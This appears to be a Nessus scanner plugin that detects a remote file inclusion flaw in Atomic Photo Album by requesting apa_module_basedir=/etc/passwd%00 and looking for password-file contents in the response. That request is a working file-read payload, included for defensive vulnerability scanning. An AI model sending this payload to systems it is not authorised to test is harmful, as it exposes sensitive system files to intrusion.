#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19299);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2005-2413");
  script_bugtraq_id(14368);
  script_osvdb_id(18265);

  script_name(english:"Atomic Photo Album apa_phpinclude.inc.php apa_module_basedir Parameter Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is vulnerable to a
remote file inclusion attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Atomic Photo Album, a free, PHP-based photo
gallery. 

The installed version of Atomic Photo Album allows remote attackers to
control the 'apa_module_basedir' variable used when including PHP code
in the 'apa_phpinclude.inc.php' script.  By leveraging this flaw, an
attacker may be able to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/406364/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Ensure that PHP's 'magic_quotes_gpc' setting is enabled and
that 'allow_url_fopen' is disabled." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/23");
 script_cvs_date("$Date: 2011/03/14 21:48:01 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for apa_module_basedir variable file include vulnerability in Atomic Photo Album";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/apa_phpinclude.inc.php?",
      "apa_module_basedir=/etc/passwd%00" ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_hole(port);
    exit(0);
  }
}
